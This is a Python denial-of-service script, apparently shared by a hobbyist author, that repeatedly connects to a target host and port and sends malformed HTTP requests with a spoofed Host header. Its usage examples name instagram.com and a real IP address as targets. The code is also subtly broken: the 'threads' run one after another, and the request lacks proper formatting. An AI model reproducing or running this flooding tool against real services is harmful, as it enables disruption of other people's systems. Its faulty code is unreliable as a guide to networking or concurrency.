#!/usr/bin/python
'coded by l314ck_h4ck3l2 '

import os
import sys
import re
import threading
from socket import socket , gethostbyname , gethostbyaddr , AF_INET , SOCK_STREAM


blue = '\033[34m'
green = '\033[32m'
red = '\033[31m'
yellow = '\033[33m'
error = '\033[91m'
cyan = '\033[36m'
bold    = "\033[;1m"
reset = "\033[0;0m"

ip_regex = '^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
fake_ip = '44.168.215.56'

def banner():
    print(f"""{blue}

            /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
            | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
            | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
            | $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
            | $$  | $$| $$  | $$| $$  | $$ \____  $$
            | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
            | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
            |_______/ |_______/  \______/  \______/ 
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ~                   {cyan}Author : l314ck_h4ck3l2{blue}                   ~
 ~          {cyan}github : https://github.com/l314ck-h4ck3l2{blue}         ~
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

{reset}""")

def ddos(ip:str , port:int , counter:int):
    s = socket(AF_INET ,SOCK_STREAM)
    s.connect((ip , port))
    s.sendto((f'GET /{ip}HTTP/1.1').encode('ascii') , (ip , port))
    s.sendto((f'HOST : {fake_ip}').encode('ascii') , (ip , port))
    print(f'{green} Pocket {str(counter)} Sent !{reset}')

def usage():
    print(f'{error} Usage   : python DDos.py [host or ip] [port] [thread]{reset}')
    print(f'{error} Example : python DDos.py 31.13.72.174 80 100{reset}')
    print(f'{error} Example : python DDos.py instagram.com 80 100{reset}')
    print(f'{error} Example : python DDos.py https://www.instagram.com 80 100{reset}')
    sys.exit()

def main():
    os.system('cls' or 'clear')
    banner()
    if len(sys.argv) == 4:
        if (re.search(ip_regex, sys.argv[1])):
            addr = sys.argv[1]
            name = gethostbyaddr(addr)
        elif sys.argv[1].startswith('http://www.'):
            name = sys.argv[1][11:]
            addr = gethostbyname(name)
        elif sys.argv[1].startswith('https://www.'):
            name = sys.argv[1][12:]
            addr = gethostbyname(name)
        else:
            try:
                name = sys.argv[1]
                addr = gethostbyname(name)
            except:
                print(f'{red} [!] Host or Ip is Not True !{reset}')
                sys.exit()
        try:
            port = int(sys.argv[2])
            thread = int(sys.argv[3])
        except:
            print(f'{red} [!] Arguments are not True !{reset}')
            sys.exit()
        print(f'{yellow} name : {name}{reset}')
        print(f'{yellow} addr : {addr}{reset}')
        print(f'{yellow} port : {port}{reset}')
        print(f'{yellow} thread : {thread}{reset}')
        print()
        for counter in range(1, int(thread) + 1):
            _thread = threading.Thread(target=ddos(addr, port, counter))
            _thread.start()
    else:
        usage()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'{red} [-] ^C received . shutting down server !{reset}')
        sys.exit()
